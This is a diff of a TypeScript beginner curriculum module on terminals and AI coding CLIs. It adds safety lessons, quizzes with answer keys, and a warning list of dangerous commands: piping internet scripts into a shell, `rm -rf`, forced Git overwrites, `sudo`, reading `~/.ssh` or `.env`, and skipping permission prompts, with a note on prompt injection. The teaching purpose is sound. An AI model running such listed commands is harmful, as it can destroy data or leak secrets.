@@ -4,7 +4,7 @@ export const MODULE_5: CurriculumModule = {
   id: 'mod-5-claude-cli',
   number: 5,
   title: 'Using Claude Code & AI CLIs',
-  subtitle: 'Conquer terminal anxiety in minutes and learn how to partner with Claude Code CLI right inside your project folder.',
+  subtitle: 'Conquer terminal anxiety and learn how to partner safely with AI coding CLIs inside a project folder.',
   icon: 'terminal',
   accentHex: '#EC4899',
   estimatedMinutes: 18,
@@ -18,19 +18,19 @@ export const MODULE_5: CurriculumModule = {
       readMinutes: 4,
       xpReward: 30,
       summary:
-        'Movies make the black terminal window look like hacker magic, yet it is just a polite text-based file browser. Learn the only four everyday commands you need to feel right at home.',
+        'Movies make the terminal window look like hacker magic, yet it is just a text-based way to navigate folders. Learn the four everyday commands—and the real truth about terminal safety.',
       analogy: {
         title: 'Pointing at Menu Pictures vs. Ordering by Name',
-        body: 'Clicking icons in Finder or File Explorer is like pointing at glossy photos on a restaurant menu. Typing inside a terminal (CLI) is simply saying "One masala chai, please" out loud. Same kitchen, same computer—just faster, clearer, and able to talk directly to powerful AI assistants.'
+        body: 'Clicking icons in Finder or File Explorer is like pointing at glossy photos on a restaurant menu. Typing inside a terminal (CLI) is simply saying "One masala chai, please" out loud. Same computer, same folders—just faster, clearer, and able to work directly with AI coding tools.'
       },
       sections: [
         {
-          heading: 'What the terminal really is (and why you will not break your computer)',
-          body: 'If opening a dark window with a blinking cursor makes your stomach drop, you are in great company! Almost everyone feels that way at first because Hollywood only shows terminals during bank heists.\n\nHere is the reassuring truth: the **Terminal** (also called Command Line or Shell) is simply a text conversation with your computer’s folders. You cannot accidentally "blow up your computer" by typing normal navigation commands—and anything destructive always requires explicitly asking for it.',
+          heading: 'What the terminal really is (and how to respect it safely)',
+          body: 'If opening a dark window with a blinking cursor makes your stomach drop, you are in great company. The **Terminal** (Command Line or Shell) is simply a text conversation with your computer’s folders and programs.\n\nRead-only navigation commands like `pwd` and `ls` are completely safe to explore. At the same time, respect one crucial reality: **unlike clicking Delete in a desktop window, destructive terminal commands often run immediately with NO confirmation prompt and NO Recycle Bin/Trash**! Commands like `rm`, overwriting with `mv` or `>`, or piping internet scripts (`curl ... | sh`) act right away—so read every command before pressing Enter.',
           callout: {
             type: 'myth',
             title: 'Myth Buster: "You must memorize 100 cryptic commands to use a terminal"',
-            body: 'Not even close! Most beginners—and plenty of seasoned builders—use just **four** navigation commands 95% of the time, and let AI explain or suggest any other command on demand.'
+            body: 'Not even close! Most everyday work uses just **four** safe navigation commands 95% of the time—and you can always ask AI to explain any unfamiliar command word for word before you run it.'
           }
         },
         {
@@ -44,27 +44,32 @@ export const MODULE_5: CurriculumModule = {
         },
         {
           heading: 'Three comfort shortcuts that make the terminal feel cozy',
-          body: 'Once you know the Fabulous Four, three keyboard habits turn the terminal from awkward into joyful:\n\n1. **Up Arrow (`↑`)**: Cycles back through commands you already typed so you never retype long paths.\n2. **Tab key (`Tab`)**: Auto-completes long folder and file names after just 2–3 letters (zero typos!).\n3. **`Ctrl + C`**: The universal polite panic brake! If a command is running too long or you want to cancel a line you started typing, press `Ctrl + C` to stop immediately and get a clean prompt back.',
+          body: 'Once you know the Fabulous Four, three keyboard habits turn the terminal from awkward into effortless:\n\n1. **Up Arrow (`↑`)**: Cycles back through commands you already typed so you never retype long paths.\n2. **Tab key (`Tab`)**: Auto-completes long folder and file names after 2–3 letters (fewer typos!).\n3. **`Ctrl + C`**: The universal polite panic brake! If a command is running too long or you want to cancel a line you started typing, press `Ctrl + C` to interrupt it and get a clean prompt back.',
           callout: {
             type: 'tip',
-            title: 'Practice zero-risk inside the CLI Dojo',
-            body: 'Marain includes a Guided Safe Terminal Dojo where you can type `pwd`, `ls`, `cd`, and `claude` with clickable hints and zero chance of touching real system files!'
+            title: 'Quick phone drill: trace the four commands in your head',
+            body: 'Imagine opening a terminal in `/home/alex`. You want to create a `cafe-site` folder, step inside, and confirm your location. The exact sequence is `mkdir cafe-site` -> `cd cafe-site` -> `pwd`.'
           }
         }
       ],
       keyTakeaways: [
-        'The terminal (CLI) is simply a text-based way to open folders and launch programs—nothing mysterious or fragile.',
-        'Four simple commands cover nearly everything you need: `pwd` (where am I?), `ls` (what is here?), `cd` (move folder), and `mkdir` (create folder).',
-        'Press `Tab` to autocomplete names, `Up Arrow` to repeat commands, and `Ctrl + C` anytime to cancel cleanly.'
+        'Four simple commands cover everyday navigation: `pwd` (where am I?), `ls` (what is here?), `cd` (move folder), and `mkdir` (create folder).',
+        'Unlike Trash/Recycle Bin clicks, destructive shell commands (`rm`, `mv` overwrite, `>`, `curl | sh`) often execute immediately without confirmation—always read before running.',
+        'Use `Tab` to autocomplete names, `Up Arrow` to recall commands, and `Ctrl + C` to interrupt a stuck command.'
       ],
       glossaryTermIds: ['terminal', 'cli', 'working-directory'],
-      relatedLabId: 'claude-cli',
+      relatedLabId: null,
       quiz: [
         {
           id: 'q-5-1-1',
           type: 'multiple_choice',
-          question: 'You just opened your terminal and want to check which folder you are currently inside. Which command do you type?',
-          options: ['mkdir', 'pwd', 'exit', 'delete'],
+          question: 'You just opened a terminal and want to check which exact folder you are currently standing inside. Which command do you type?',
+          options: [
+            'mkdir',
+            'pwd',
+            'cd ..',
+            'ls'
+          ],
           correctIndex: 1,
           explanation:
             '`pwd` stands for Print Working Directory—it immediately prints the exact folder path your terminal is currently standing inside.'
@@ -73,26 +78,26 @@ export const MODULE_5: CurriculumModule = {
           id: 'q-5-1-2',
           type: 'true_false',
           question:
-            'Pressing `Ctrl + C` in the terminal safely interrupts a stuck command or clears the current line so you get a fresh prompt back.',
+            'Destructive terminal commands like `rm` or redirecting with `>` always pause with a confirmation dialog and move files safely to the Recycle Bin first.',
           options: ['True', 'False'],
-          correctIndex: 0,
+          correctIndex: 1,
           explanation:
-            'True! `Ctrl + C` is your friendly emergency brake in almost every terminal program.'
+            'False! Many shell commands (`rm`, `mv` overwrites, `>` truncation, `git reset --hard`) act immediately with no prompt and no Recycle Bin—always read commands carefully before pressing Enter.'
         },
         {
           id: 'q-5-1-3',
           type: 'spot_mistake',
           question:
-            'Maya wants to list the files inside her `portfolio` folder, so she opens the terminal in her home folder and types `ls` without ever running `cd portfolio`. Why does she not see `index.html`?',
+            'Maya wants to list the files inside her `portfolio` folder, so she opens the terminal in her home folder and types `ls` without running `cd portfolio`. Why does she not see `index.html`?',
           options: [
-            'Her working directory is still her home folder—she needs to walk into the project first using `cd portfolio`, then run `ls`.',
-            '`ls` cannot show HTML files.',
-            'HTML files are always invisible in Linux.',
-            'She needed to reboot before running `ls`.'
+            'Her working directory is still home—she must run `cd portfolio` first.',
+            'The `ls` command hides web files like HTML and CSS unless you run it with administrator privileges.',
+            'Terminal sessions can only display folders created during the exact same session using `mkdir`.',
+            'Every `ls` command requires passing the full absolute path from `/` before showing any subfolder.'
           ],
           correctIndex: 0,
           explanation:
-            'Terminal commands always act on your current working directory! Always check `pwd` and `cd` into your project folder before inspecting files or launching an AI CLI.'
+            'Terminal commands act on your current working directory! Check `pwd` and `cd` into your project folder before inspecting files or launching an AI CLI.'
         }
       ]
     },
@@ -100,90 +105,90 @@ export const MODULE_5: CurriculumModule = {
       id: 'ch-5-2',
       moduleId: 'mod-5-claude-cli',
       number: 2,
-      title: 'What Is Claude Code CLI & How to Install / Auth It',
+      title: 'What Is Claude Code CLI & How to Scope It Safely',
       readMinutes: 4,
       xpReward: 30,
       summary:
-        'Claude Code (and sibling AI CLIs like Gemini CLI and Codex CLI) puts an AI agent directly inside your project folder—no more copy-pasting code back and forth from browser tabs.',
+        'Claude Code (and sibling AI CLIs like Gemini CLI and Codex CLI) puts an AI agent inside your project folder—removing copy-paste gymnastics while requiring disciplined folder scoping.',
       analogy: {
-        title: 'Inviting the Carpenter Inside the Workshop',
-        body: 'Using a browser chatbot to build software is like taking photos of a wobbly table, texting them to a carpenter across town, reading their reply, and sawing the wood yourself. Using Claude Code CLI is inviting the carpenter right into your workshop: they look directly at the real table, measure the legs, propose exact cuts for your approval, and double-check that it stands level.'
+        title: 'Inviting the Carpenter Inside One Specific Room',
+        body: 'Using a browser chatbot to build software is like texting photos of a wobbly table to a carpenter across town and sawing the wood yourself. Using an AI CLI invites the carpenter right into your workshop to measure, propose cuts for approval, and check the result—which is why you invite them into ONE project room, never your whole house!'
       },
       sections: [
         {
-          heading: 'Why AI CLIs changed everything for non-coders',
-          body: 'For the first two years of ChatGPT, non-technical beginners hit the same frustrating wall: copy code from chat -> paste into the wrong file -> miss one curly bracket -> paste the whole file back -> repeat 30 times until giving up.\n\n**Claude Code CLI** (built by Anthropic—with similar terminal agents like Gemini CLI and OpenAI Codex CLI) eliminated copy-paste gymnastics completely. Because it runs right inside your project folder, it can:\n\n• Read all your files automatically so it understands the whole project\n• Propose clean surgical edits with a red/green preview diff\n• Run tests or check errors right in the terminal\n• Wait calmly for your **Yes / No** before touching anything',
+          heading: 'Why AI CLIs changed everything for beginners',
+          body: 'With plain browser chatbots, beginners hit the same frustrating wall: copy code from chat -> paste into the wrong file -> miss one bracket -> paste the whole file back -> repeat 30 times.\n\n**Claude Code CLI** (and similar terminal agents like Gemini CLI and OpenAI Codex CLI) runs directly inside your project folder so it can:\n\n• Read your real files instead of guessing from pasted fragments\n• Propose clean surgical edits with a red/green diff preview\n• Run tests or check errors right in the terminal\n• Pause calmly for your explicit **Yes / No** approval before modifying files or running commands',
           callout: {
             type: 'example',
-            title: 'The entire magic starts with one word',
-            body: 'Once installed, you walk into any project folder (`cd my-website`) and type a single word:\n`claude`\nAn interactive chat prompt opens right inside your terminal—already connected to that folder!'
+            title: 'The entire workflow starts with one focused command',
+            body: 'Walk into a dedicated project folder (`cd ~/Projects/my-website`), confirm with `pwd`, and launch the CLI (for example `claude`). The interactive prompt opens scoped right to that folder.'
           }
         },
         {
-          heading: 'How installation and sign-in actually work',
-          body: 'Setting up an AI CLI takes about two minutes on Linux, macOS, or Windows (via WSL/PowerShell):\n\n1. **Install the CLI**: For Claude Code, Anthropic provides a one-line official installer (or `npm install -g @anthropic-ai/claude-code` if you have Node.js installed).\n2. **Authenticate once**: The first time you run `claude`, it opens a normal browser login screen so you can sign in with either your eligible Claude subscription OR connect your pay-as-you-go Anthropic API key.\n3. **Confirm folder trust**: When you launch `claude` in a new folder, it asks *"Do you trust the files in this folder?"*—confirm only inside your own project folders, never random downloads!',
+          heading: 'Installation, authentication, and folder trust',
+          body: 'Setting up an AI CLI takes a couple of minutes when you are at a computer:\n\n1. **Install only from official docs**: Use the provider’s official installer or documented package command—never copy-paste random install scripts from forum comments.\n2. **Authenticate cleanly**: Sign in via the official browser login (eligible subscription) or connect a scoped, capped API key.\n3. **Treat the "Trust this folder?" prompt seriously**: Untrusted downloads or random repositories can contain hidden hooks, build scripts, or tool configs—only trust folders whose files you actually know!',
           callout: {
             type: 'warning',
             title: 'Always `cd` into a dedicated project folder first!',
-            body: 'Never launch an AI coding CLI directly inside your giant home folder (`/home/you`) or root folder (`/`). Create a neat subfolder like `~/Marain-Projects/my-first-site`, `cd` into it, and launch `claude` there so its workspace stays tightly focused.'
+            body: 'Never launch an AI coding CLI inside your top-level home folder (`/home/you`), Documents, or root (`/`). Keep each project in its own subfolder so personal tax PDFs, SSH keys, and unrelated files stay completely out of scope.'
           }
         },
         {
-          heading: 'You can use the same mental model across every AI CLI',
-          body: 'Even though this module highlights **Claude Code CLI** because of its crisp diff workflow and beginner clarity, every skill you learn here transfers directly to **Gemini CLI**, **Codex CLI**, **OpenCode**, and visual editors like **Cursor** or **Antigravity**. All of them share the same core heartbeat: stand in a project folder -> explain what you want -> review diffs -> verify -> save a Git checkpoint.',
+          heading: 'One mental model works across every AI CLI',
+          body: 'Even though this unit highlights **Claude Code CLI** for its clear diff approvals, the exact same habits transfer directly to **Gemini CLI**, **Codex CLI**, **OpenCode**, and AI editors like **Cursor** or **Antigravity**: isolate the folder -> explain first -> review diffs -> verify -> save a clean Git checkpoint.',
           callout: {
             type: 'tip',
-            title: 'No account needed to practice right now',
-            body: 'You do not need to pay a cent or install Claude Code today to master the workflow—Marain’s Claude Code CLI Dojo lets you run through all 6 real-world CLI missions safely in Practice Mode first!'
+            title: 'No desktop needed to master the workflow',
+            body: 'Every command, diff check, and Git safety habit you learn here is a mental checklist—once you recognize red/green diffs and safe scoping, using any real AI CLI feels natural on day one.'
           }
         }
       ],
       keyTakeaways: [
-        'Claude Code CLI runs an AI agent directly inside your project folder, eliminating painful copy-paste cycles from browser tabs.',
-        'Always `cd` into a dedicated project subfolder before running `claude` so the agent stays neatly scoped to that project.',
-        'The core workflow—prompt, review diff, approve, verify, commit—transfers cleanly across Claude Code, Gemini CLI, Codex CLI, and AI editors.'
+        'AI CLIs run inside your project folder to read files, propose red/green diff edits, and verify changes without tedious copy-paste cycles.',
+        'Always `cd` into a dedicated project subfolder—and only trust folders you know, since untrusted repos can hide malicious hooks or configs.',
+        'The same safe workflow (scope -> explain -> review diff -> verify -> commit) works across Claude Code, Gemini CLI, Codex CLI, and AI editors.'
       ],
       glossaryTermIds: ['claude-code', 'cli', 'ai-harness', 'working-directory'],
-      relatedLabId: 'claude-cli',
+      relatedLabId: null,
       quiz: [
         {
           id: 'q-5-2-1',
           type: 'multiple_choice',
-          question: 'What is the biggest advantage of using an AI CLI like Claude Code inside your project folder instead of a plain browser chat?',
+          question: 'What is the main workflow advantage of an AI coding CLI inside a project folder over a plain browser chatbot?',
           options: [
-            'It works without needing electricity.',
-            'It makes all cloud APIs permanently free.',
-            'It replaces your web browser.',
-            'It can read your actual project files, propose clean diff edits, and run verification checks directly without manual copy-pasting.'
+            'It guarantees every API call is permanently free without any token metering or subscription.',
+            'It bypasses all approval prompts so edits are saved silently without showing you a diff.',
+            'It automatically deploys your private files and `.env` secrets to a live web server.',
+            'It reads project files, proposes diffs, and verifies changes directly without copy-pasting.'
           ],
           correctIndex: 3,
           explanation:
-            'Running inside your folder lets the AI harness inspect real files, make exact surgical edits with your approval, and verify changes directly—removing tedious copy-paste errors.'
+            'Running inside a scoped project folder lets the AI harness inspect real files, present surgical diffs for your approval, and verify changes cleanly—eliminating fragile copy-paste loops.'
         },
         {
           id: 'q-5-2-2',
           type: 'true_false',
           question:
-            'Best practice is to `cd` into a dedicated project folder (such as `~/Marain-Projects/my-site`) before launching `claude`.',
+            'It is safe to click "Trust this folder" on any random zip file downloaded from the internet before inspecting what scripts or configs are inside.',
           options: ['True', 'False'],
-          correctIndex: 0,
+          correctIndex: 1,
           explanation:
-            'True! Launching inside a dedicated project folder keeps the AI focused strictly on that project’s files and away from unrelated personal documents.'
+            'False! Untrusted repositories or downloaded folders can contain malicious hooks, MCP configs, or build scripts that run commands when trusted—only trust folders you know.'
         },
         {
           id: 'q-5-2-3',
           type: 'spot_mistake',
           question:
-            'Devon opens his terminal (standing inside his entire `/home/devon` directory with personal tax PDFs and photos) and immediately runs `claude` saying "Clean up old unused files." Why is that a dangerous move?',
+            'Devon opens his terminal in his top-level `/home/devon` directory (holding personal tax PDFs, photos, and SSH keys) and runs an AI CLI saying "Clean up unused files." Why is that risky?',
           options: [
-            'Claude cannot run in Linux home folders.',
-            'Tax PDFs break tokenizers.',
-            'Running an agent from the top-level home folder gives it visibility into unrelated personal folders—always isolate projects inside their own dedicated subfolder.',
-            'The terminal only works inside the Desktop folder.'
+            'AI CLIs cannot read filenames containing spaces unless they live inside a Desktop subfolder.',
+            'Launching from the home directory exposes unrelated personal files and secrets—always isolate each project in its own subfolder.',
+            'Home directories automatically switch the AI model into read-only mode so no cleanup can run.',
+            'Running a CLI outside a Git repository doubles the per-token API price charged by the provider.'
           ],
-          correctIndex: 2,
+          correctIndex: 1,
           explanation:
-            'Scope matters! Always keep each website or app in its own clean subfolder and `cd` into it before launching an AI coding CLI.'
+            'Scope is a real safety boundary! Always isolate each website or app inside its own dedicated subfolder and `cd` into it before launching an AI coding CLI.'
         }
       ]
     },
@@ -195,24 +200,24 @@ export const MODULE_5: CurriculumModule = {
       readMinutes: 5,
       xpReward: 35,
       summary:
-        'Follow the gentle four-beat rhythm every confident AI builder uses: ask the AI to explain first, request one small edit, read the red-and-green diff before approving, and know how to undo in one second.',
+        'Follow the calm four-beat rhythm every confident AI builder uses: ask the AI to explain first, request one small edit, read the red-and-green diff before approving, and checkpoint safely with Git.',
       analogy: {
         title: 'Track Changes in Google Docs',
-        body: 'If an editor suggests changes to your essay in Google Docs, old words show struck through in red and new words appear in green, with a neat Accept / Reject button on the side. An AI CLI **diff** works the exact same way—you never have to guess what changed or blindly accept edits.'
+        body: 'When an editor suggests changes in Google Docs, old words show struck through in red and new words appear in green, with an Accept / Reject button beside them. An AI CLI **diff** works the exact same way—you never have to guess what changed or blindly accept edits.'
       },
       sections: [
         {
           heading: 'Step 1: Start by asking the AI to EXPLAIN before editing',
-          body: 'When you open a project folder with `claude`, your very best opening prompt is NOT "rewrite everything." Start with curiosity:\n\n*"Explain what files are in this folder and what each one does, in plain English for a beginner."*\n\nIn five seconds, the agent reads the folder and hands you a friendly map. Asking for explanations first builds your confidence AND verifies that the AI actually sees the right files.',
+          body: 'When you open a project folder in an AI CLI, your best opening prompt is NOT "rewrite everything." Start with curiosity:\n\n*"Explain what files are in this folder and what each one does, in plain English—do not edit anything yet."*\n\nIn seconds, the agent gives you a plain map of the project AND proves it is standing in the right directory.',
           callout: {
             type: 'tip',
-            title: 'You are allowed to ask "dumb" questions—all day long!',
-            body: 'Never feel shy asking your CLI: "What does line 14 of styles.css do?" or "Explain why you suggested adding this button before making any edits." The terminal never judges you!'
+            title: 'Ask questions freely before touching code',
+            body: 'Asking "What does line 14 of styles.css do?" or "Why are you suggesting this change?" builds real intuition—and helps you spot weird suggestions before approving them.'
           }
         },
         {
           heading: 'Step 2 & 3: Request one focused edit and read the Diff',
-          body: 'Next, ask for ONE concrete improvement at a time—for instance: *"Add a welcoming hero banner at the top of `index.html` with a green Get Started button."*\n\nBefore saving anything, Claude Code pauses and displays a **Diff**:\n• Lines starting with **`-`** in **red** are lines being removed or replaced.\n• Lines starting with **`+`** in **green** are brand-new lines being added.\n• Unchanged lines sit around them in neutral gray for context.\n\nEven if you do not know every code keyword, you can scan the text strings, titles, colors, and file name! Confirm it is touching the file you expect, then press **Yes (`y`)** to approve—or **No (`n`)** to ask for a tweak.',
+          body: 'Next, ask for ONE concrete improvement at a time—for instance: *"Add a welcoming hero banner at the top of `index.html` with a green Get Started button."*\n\nBefore saving anything, the CLI displays a **Diff**:\n• Lines starting with **`-`** in **red** are being removed or replaced.\n• Lines starting with **`+`** in **green** are being added.\n• Unchanged gray lines sit around them for context.\n\nConfirm the filename is the one you expected, scan the changed text and colors, then press **Yes** to approve—or **No** to ask for a revision.',
           callout: {
             type: 'example',
             title: 'Reading a 4-line diff takes 3 seconds',
@@ -220,61 +225,61 @@ export const MODULE_5: CurriculumModule = {
           }
         },
         {
-          heading: 'Step 4: The safety net—how Undo works with Git',
-          body: 'What if you approve an edit, open the website in your browser, and think *"Hmm, actually that looked better five minutes ago"*?\n\nMeet **Git**, the free time machine built into almost every developer machine. If you initialize Git once (`git init`) and save a quick checkpoint (`git add . && git commit -m "Working homepage"`) whenever your project looks good, you unlock instant undo:\n\n• **`git status`** -> Shows exactly which files were modified since your last save point.\n• **`git diff`** -> Re-shows every red/green change made so far.\n• **`git checkout -- index.html`** -> Instantly restores `index.html` back to your clean saved version!\n\nOr even simpler: tell Claude Code itself, *"Undo the last change to index.html and explain what you reverted."*',
+          heading: 'Step 4: The safety net—clean Git checkpoints without leaking secrets',
+          body: 'What if you approve an edit, check the result, and prefer how it looked five minutes ago?\n\n**Git** is a free snapshot system for your folder. Before trying a big experiment, save a clean checkpoint—**and ALWAYS inspect `git status` first instead of blindly running `git add .`**!\n\n• **`git status`** -> Lists modified and untracked files so you immediately spot if `.env` or a stray private file is missing from `.gitignore`!\n• **`git diff`** -> Shows every line changed since your last commit.\n• Stage specific clean files (`git add index.html styles.css`) and commit (`git commit -m "Working homepage"`).\n• To revert an unwanted edit safely, verify what will be discarded with `git diff` first, then restore that file (note: discarding uncommitted edits is permanent!).',
           callout: {
             type: 'warning',
-            title: 'Save a Git checkpoint BEFORE asking for big redesigns',
-            body: 'Just like saving your video game right before entering a boss room, running a quick Git commit before big layout experiments guarantees you can ALWAYS roll back with zero stress.'
+            title: 'Never blindly run `git add .` without checking `git status`',
+            body: 'If `.gitignore` is missing or has a typo, `git add .` quietly stages `.env` and secret files right into your commit! Always run `git status` first and verify no secret files appear.'
           }
         }
       ],
       keyTakeaways: [
-        'Start sessions by asking the AI CLI to explain the folder in plain English before changing anything.',
-        'Read the red (`-` removed) and green (`+` added) Diff carefully to confirm which file is changing before pressing Approve.',
-        'Git acts as an unlimited save-slot time machine: `git status` shows modified files and checkpoints let you undo any experiment cleanly.'
+        'Start sessions by asking the AI CLI to explain the folder in plain English before editing anything.',
+        'Read the red (`-` removed) and green (`+` added) Diff and verify the target filename before pressing Approve.',
+        'Always check `git status` and `.gitignore` before staging—never blindly run `git add .`—and commit working milestones before big redesigns.'
       ],
       glossaryTermIds: ['diff', 'claude-code', 'git', 'commit', 'human-in-the-loop'],
-      relatedLabId: 'claude-cli',
+      relatedLabId: null,
       quiz: [
         {
           id: 'q-5-3-1',
           type: 'multiple_choice',
-          question: 'When an AI CLI shows you a Diff preview before editing a file, what do green lines marked with `+` mean?',
+          question: 'When an AI CLI shows a Diff preview before modifying a file, what do green lines prefixed with `+` indicate?',
           options: [
-            'Lines that caused an internet error.',
-            'New lines that will be added to the file if you approve.',
-            'Old lines being permanently deleted.',
-            'Secret API keys.'
+            'Lines with syntax errors being removed.',
+            'New lines that will be added if you approve.',
+            'Files that Git has already added to `.gitignore` to keep them private.',
+            'Read-only context lines copied from neighboring files that will stay unchanged.'
           ],
           correctIndex: 1,
           explanation:
-            'In every standard Diff view, red `-` lines are removals and green `+` lines are additions—just like Track Changes in a document.'
+            'In standard Diff views, red `-` lines are removals and green `+` lines are additions—just like Track Changes in a document.'
         },
         {
           id: 'q-5-3-2',
           type: 'true_false',
           question:
-            'Saving a Git commit right before trying a big redesign lets you roll back easily if the new experiment does not look right.',
+            'Running `git add .` without checking `git status` first is always safe because Git automatically blocks any file containing an API key.',
           options: ['True', 'False'],
-          correctIndex: 0,
+          correctIndex: 1,
           explanation:
-            'True! A Git commit is a clean, permanent save point you can inspect or restore at any time.'
+            'False! Local Git does NOT automatically detect API keys—if `.env` is missing from `.gitignore`, `git add .` stages it immediately. Always run `git status` first!'
         },
         {
           id: 'q-5-3-3',
           type: 'spot_mistake',
           question:
-            'Chris opens Claude Code in a folder with 12 files and clicks "Auto-approve all edits" without reading diffs or creating a Git checkpoint. Halfway through, the site breaks and he cannot remember what changed. What two habits would have protected him?',
+            'Chris opens an AI CLI in a 12-file project and enables blanket auto-approve without reading diffs or saving a Git commit. Halfway through, the site breaks and he cannot tell what changed. What two habits would have protected him?',
           options: [
-            'Saving a Git commit first and reviewing small focused diffs one step at a time.',
-            'Increasing font size and unplugging Wi-Fi.',
-            'Deleting `index.html` before starting.',
-            'Using ALL CAPS in prompts.'
+            'Saving a clean Git commit first and reviewing small diffs one step at a time.',
+            'Turning off `.gitignore` and editing all files at once.',
+            'Running `git reset --hard` after every prompt to clear edits.',
+            'Switching to a higher temperature dial so the CLI explains changes in longer paragraphs.'
           ],
           correctIndex: 0,
           explanation:
-            'Small edits + reading diffs + Git checkpoints turn AI building into a calm, reversible creative process where mistakes never hurt!'
+            'Saving a clean Git checkpoint first and approving small, readable diffs one step at a time keeps every experiment calm and reversible!'
         }
       ]
     },
@@ -282,48 +287,48 @@ export const MODULE_5: CurriculumModule = {
       id: 'ch-5-4',
       moduleId: 'mod-5-claude-cli',
       number: 4,
-      title: 'Power Workflows: Planning, Pasting Errors, `/compact` & Git Safety',
+      title: 'Power Workflows: Planning, Exact Errors, `/compact` & Command Safety',
       readMinutes: 5,
       xpReward: 35,
       summary:
-        'Level up from curious beginner to smooth AI builder with four effortless everyday workflows: Plan-before-edit, pasting exact errors or screenshots, compacting memory, and keeping Git tidy.',
+        'Level up from curious beginner to calm, security-minded builder with four everyday habits: plan before editing, share exact errors, compact context cleanly, and reject unsafe shell permissions.',
       analogy: {
-        title: 'Measure Twice, Cut Once—With a Tidy Workbench',
-        body: 'Great woodworkers do not grab a saw the instant they walk in. They sketch a quick plan on paper (Plan Mode), snap a photo when a joint looks crooked (Screenshots & Exact Errors), sweep sawdust off the bench between projects (`/compact`), and double-check their work before gluing (Git Safety).'
+        title: 'Measure Twice, Cut Once—With Real Safety Guards',
+        body: 'Great woodworkers do not grab a saw the instant they walk in. They sketch a quick plan (Plan Mode), inspect exact measurements (Exact Errors & Screenshots), sweep sawdust between tasks (`/compact`), and never disable the saw’s blade guard (Approval & Permission Safety).'
       },
       sections: [
         {
           heading: 'Workflow 1: Plan first, edit second',
-          body: 'When you want something bigger than a tiny tweak—say, adding a dark mode toggle plus saving the user’s preference—do NOT ask the AI to jump straight into editing five files at once.\n\nInstead, ask for a **plan first**: *"Do not edit any files yet. Propose a simple 3-step plan for adding a dark mode toggle and list which files you will touch."* Many CLIs (including Claude Code) even have a dedicated **Plan Mode** toggle! Reviewing a 5-line plan takes ten seconds and prevents 90% of messy detours.',
+          body: 'When you want something bigger than a tiny tweak—say, adding dark mode plus saving the user’s preference—do NOT ask the AI to jump straight into editing five files at once.\n\nAsk for a **plan first**: *"Do not edit any files yet. Propose a simple 3-step plan and list which files you will touch."* Many CLIs include a dedicated **Plan Mode** toggle. Reviewing a 5-line plan takes ten seconds and prevents 90% of messy detours.',
           callout: {
             type: 'tip',
             title: 'The magic phrase for calm building',
-            body: 'Start bigger requests with: **"Before changing code, explain your plan in 4 short bullets and wait for my go-ahead."** You will feel like a real tech lead immediately!'
+            body: 'Start bigger requests with: **"Before changing code, explain your plan in 4 short bullets and wait for my go-ahead."**'
           }
         },
         {
-          heading: 'Workflow 2: Paste exact error messages & screenshots—never vague summaries',
-          body: 'Remember how multimodal modern models are? When something looks crooked on your webpage or throws a red error, avoid typing *"It broke, please fix it."*\n\nGive the AI two golden clues instead:\n1. **Copy-paste the exact error text** from your terminal or browser console word for word.\n2. **Paste a screenshot** right into the CLI or chat so the AI can literally see the misaligned button or squished mobile layout with its own eyes!',
+          heading: 'Workflow 2: Paste exact error messages & screenshots (redacting secrets!)',
+          body: 'When something looks crooked or throws a red error, skip *"It broke, fix it."* Give the AI two sharp clues:\n\n1. **Copy-paste the exact error text** word for word (making sure no API keys, tokens, or passwords appear in the log!).\n2. **Share a screenshot** so a multimodal model can literally see the overlapping button or squished mobile layout.',
           callout: {
             type: 'example',
             title: 'Vague report vs. Pro bug report',
-            body: 'Vague: "The button doesn’t work."\nPro: "When I click Calculate, nothing happens and the browser console shows: `TypeError: Cannot read properties of null (reading value) at script.js:29`. Please explain why and fix it."'
+            body: 'Vague: "The button doesn’t work."\nPro: "When I click Calculate, nothing happens and the console shows: `TypeError: Cannot read properties of null (reading value) at script.js:29`. Explain why first, then apply the smallest fix."'
           }
         },
         {
-          heading: 'Workflow 3 & 4: Sweep the desk with `/compact` & protect your work with Git',
-          body: 'After finishing one feature—like your homepage navigation—your terminal conversation may have piled up dozens of file reads and diffs. Running **`/compact`** summarizes the key decisions and wipes away old clutter from the context window, making your next feature faster, smarter, and cheaper! (And `/clear` starts an even fresher slate when jumping to a totally different task.)\n\nPair that with one quick Git habit after every small milestone: ask your CLI *"Show `git status`, make sure `.env` is ignored, and commit this working milestone with a clear message."* Clean desk + saved checkpoint = unstoppable momentum.',
+          heading: 'Workflow 3 & 4: Sweep with `/compact` & NEVER disable safety approvals',
+          body: 'After finishing one milestone, running **`/compact`** summarizes key decisions and clears noisy clutter from the context window, keeping the next task sharper and cheaper (and `/clear` resets completely for an unrelated task).\n\nMost importantly, **never turn off permission guardrails for convenience**: avoid wildcard auto-allow flags (like `--dangerously-skip-permissions` or blanket `Bash(*)`), and pause on ANY command that:\n• Pipes internet scripts into a shell (`curl ... | sh`)\n• Deletes or forcefully overwrites files/history (`rm -rf`, `git push --force`, `git reset --hard`)\n• Escalates privileges or loosens permissions (`sudo`, `chmod 777`)\n• Reads sensitive paths (`~/.ssh`, `.env`, credential stores) or sends local data to unfamiliar URLs—especially after reading untrusted web docs or repos that could carry **prompt injection**!',
           callout: {
             type: 'warning',
-            title: 'One golden boundary for terminal commands',
-            body: 'If an AI CLI ever asks to run a command containing `rm -rf`, `sudo`, or uploading secrets outside your project folder, always pause and hit **No** unless you completely understand what it does.'
+            title: 'Think allowlist, not just a tiny denylist',
+            body: 'Dangerous commands go way beyond `rm -rf` and `sudo`! Never approve any shell command you do not understand, never turn on blanket wildcard shell access (`Bash(*)`), and inspect network, install, or permission-changing commands carefully.'
           }
         }
       ],
       keyTakeaways: [
-        'Ask your AI CLI for a short plain-English plan BEFORE editing multiple files ("Measure twice, cut once").',
-        'Always share exact error text and screenshots instead of vague descriptions like "it broke."',
-        'Use `/compact` between milestones to keep the context window crisp and cheap, and commit working milestones in Git.'
+        'Ask for a short plain-English plan BEFORE editing multiple files ("Measure twice, cut once").',
+        'Share exact (secret-redacted) error text and screenshots instead of vague descriptions like "it broke."',
+        'Use `/compact` between milestones, never enable wildcard auto-approve flags (`--dangerously-skip-permissions`, `Bash(*)`), and scrutinize every command touching files, permissions, Git history, secrets, or the network.'
       ],
       glossaryTermIds: ['compact-command', 'claude-code', 'git', 'console-error', 'multimodal'],
       relatedLabId: 'claude-cli',
@@ -331,43 +336,109 @@ export const MODULE_5: CurriculumModule = {
         {
           id: 'q-5-4-1',
           type: 'multiple_choice',
-          question: 'When is the best time to run `/compact` during a long Claude Code CLI session?',
+          question: 'When is the best time to run `/compact` during a long AI CLI session?',
